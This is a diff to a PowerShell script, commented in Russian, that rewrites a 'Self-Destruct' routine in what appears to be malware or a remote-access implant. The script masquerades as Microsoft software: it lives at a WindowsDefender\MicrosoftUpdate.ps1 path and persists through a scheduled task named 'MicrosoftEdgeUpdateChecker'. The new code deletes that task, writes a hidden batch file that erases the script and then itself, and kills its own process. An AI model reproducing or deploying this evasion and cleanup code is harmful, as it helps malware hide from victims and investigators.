@@ -278,21 +278,28 @@ function Connect-ZiPo {
 
     function Self-Destruct {
     try {
-        # Путь до скрипта
         $scriptPath = $MyInvocation.MyCommand.Path
         if (-not $scriptPath) {
             $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
         }
 
-        # Удаление планировщика
         $taskName = "MicrosoftEdgeUpdateChecker"
-        schtasks /Delete /TN $taskName /F | Out-Null 2>&1
 
-        # Удаление самого файла (с задержкой)
-        $cmd = "Start-Sleep -Milliseconds 500; Remove-Item -Path `"$scriptPath`" -Force"
-        Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `$ErrorActionPreference='SilentlyContinue'; $cmd" -WindowStyle Hidden
+        # Удалить задачу автозапуска
+        schtasks /Delete /TN $taskName /F | Out-Null
 
-        Write-Output "[+] Self-destruct complete"
+        # Создать bat-файл, который подождёт и удалит PowerShell-скрипт
+        $batPath = "$env:TEMP\cleanup.bat"
+        $bat = "@echo off`r`n" +
+               "timeout /t 3 > nul`r`n" +
+               "del `"$scriptPath`" /f /q`r`n" +
+               "del `"%~f0`" /f /q"
+
+        $bat | Set-Content -Path $batPath -Encoding ASCII
+
+        # Запустить bat от имени текущего пользователя
+        Start-Process -FilePath $batPath -WindowStyle Hidden
+
         Stop-Process -Id $PID
     }
     catch {
